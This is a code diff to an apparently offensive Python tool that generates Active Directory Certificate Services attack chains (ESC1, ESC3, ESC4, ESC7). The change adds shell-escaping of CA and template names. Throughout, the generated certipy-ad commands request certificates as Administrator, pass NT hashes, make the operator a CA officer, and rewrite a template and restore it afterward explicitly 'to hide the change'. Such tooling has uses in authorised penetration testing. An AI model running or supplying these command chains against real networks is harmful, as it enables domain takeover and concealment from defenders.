@@ -1694,7 +1694,9 @@ def run(report, store, ui=None):
                     break
             if _pick is None:
                 _pick = ("<user>", "<nthash>")
-            _disp_ac = _pick[0]
+            # iter-150: shell-escape _disp_ac in the hash-fallback branch
+            # for parity with the plaintext branch (iter-135).
+            _disp_ac = _sh_sq(_pick[0])
             _ulc_ac = _pick[0].lower()
             _pw_ac = _pick[1]
             _adcs_auth = (f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_pick[1]}'"
@@ -1715,13 +1717,16 @@ def run(report, store, ui=None):
             _esc_tag = ",".join(_fires)
             # iter-88: fall back to '<CA>' placeholder when BH-CE data has
             # no CA link (only certipy find carries the CA context reliably).
-            _ca_tag = tpl["ca"] or "<CA>"
+            # iter-150: shell-escape CA + template names. AD allows spaces
+            # and ' in both ('User Signature Only', 'Fred's CA').
+            _ca_tag = _sh_sq(tpl["ca"] or "<CA>")
+            _tpl_esc1 = _sh_sq(tpl["template"])
             chains.append(Chain("R-ADCS-ESC1", "ADCS ESC1 -> Administrator PFX",
                 f"{_esc_tag} template '{tpl['template']}' -> req cert as Administrator",
                 crit=9, conf=0.9, ready=1.4, prox=0.95,      # score 10.77
                 commands=[
                     f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
-                    f"-ca '{_ca_tag}' -template '{tpl['template']}' "
+                    f"-ca '{_ca_tag}' -template '{_tpl_esc1}' "
                     f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                     f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                     f"# certipy prints the NT hash + TGT; PtH via R7 to any host",
@@ -1741,10 +1746,13 @@ def run(report, store, ui=None):
             if _tkey4 in _emitted_esc4:
                 continue
             _emitted_esc4.add(_tkey4)
-            _ca4 = tpl["ca"] or "<CA>"
-            _tpl_name = tpl["template"]
+            # iter-150: shell-escape CA + template names (see R-ADCS-ESC1 note).
+            # Keep raw copies for the human-readable description.
+            _ca4 = _sh_sq(tpl["ca"] or "<CA>")
+            _tpl_name_raw = tpl["template"]
+            _tpl_name = _sh_sq(_tpl_name_raw)
             chains.append(Chain("R-ADCS-ESC4", "ADCS ESC4 -> rewrite template -> ESC1",
-                f"ESC4 template '{_tpl_name}' - operator can WriteDacl/WriteOwner it",
+                f"ESC4 template '{_tpl_name_raw}' - operator can WriteDacl/WriteOwner it",
                 crit=9, conf=0.85, ready=1.3, prox=0.9,      # score 8.95
                 commands=[
                     f"# 1. save original template config, then rewrite to ESC1-shape:",
@@ -1758,7 +1766,7 @@ def run(report, store, ui=None):
                     f"# 3. restore the original config to hide the change:",
                     f"certipy-ad template -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                     f"-template '{_tpl_name}' "
-                    f"-configuration '{_tpl_name}.json' -dc-ip {_dc_esc}",
+                    f"-configuration '{_sh_sq(_tpl_name_raw + '.json')}' -dc-ip {_dc_esc}",
                 ], src=tpl["src"], line=tpl["line"]))
         # iter-119: R-ADCS-ESC7 - CA management ACL (ManageCA/ManageCertificates)
         # grants the operator officer-level control over the CA itself. Canonical
@@ -1773,12 +1781,14 @@ def run(report, store, ui=None):
                 continue
             if "ESC7" not in tpl["esc"]:
                 continue
-            _ca7 = tpl["ca"] or "<CA>"
-            if _ca7 in _emitted_esc7:
+            # iter-150: keep raw for display, escape for shell splice.
+            _ca7_raw = tpl["ca"] or "<CA>"
+            if _ca7_raw in _emitted_esc7:
                 continue
-            _emitted_esc7.add(_ca7)
+            _emitted_esc7.add(_ca7_raw)
+            _ca7 = _sh_sq(_ca7_raw)
             chains.append(Chain("R-ADCS-ESC7", "ADCS ESC7 -> CA officer -> SubCA cert",
-                f"ESC7 CA '{_ca7}' - operator has ManageCA/ManageCertificates",
+                f"ESC7 CA '{_ca7_raw}' - operator has ManageCA/ManageCertificates",
                 crit=9, conf=0.85, ready=1.2, prox=0.9,      # score 8.26
                 commands=[
                     f"# 1. add self as CA officer (ManageCA right):",
@@ -1815,10 +1825,12 @@ def run(report, store, ui=None):
             if _tkey3 in _emitted_esc3:
                 continue
             _emitted_esc3.add(_tkey3)
-            _ca3 = tpl["ca"] or "<CA>"
-            _tpl3 = tpl["template"] or "<ea-template>"
+            # iter-150: keep raw for display, escape for shell splice.
+            _ca3 = _sh_sq(tpl["ca"] or "<CA>")
+            _tpl3_raw = tpl["template"] or "<ea-template>"
+            _tpl3 = _sh_sq(_tpl3_raw)
             chains.append(Chain("R-ADCS-ESC3", "ADCS ESC3 -> EA cert -> on-behalf-of admin",
-                f"ESC3 template '{_tpl3}' - Enrollment Agent EKU allows on-behalf-of enrollment",
+                f"ESC3 template '{_tpl3_raw}' - Enrollment Agent EKU allows on-behalf-of enrollment",
                 crit=9, conf=0.85, ready=1.35, prox=0.9,     # score 9.29
                 commands=[
                     f"# 1. enroll for the EA cert against the vulnerable template:",
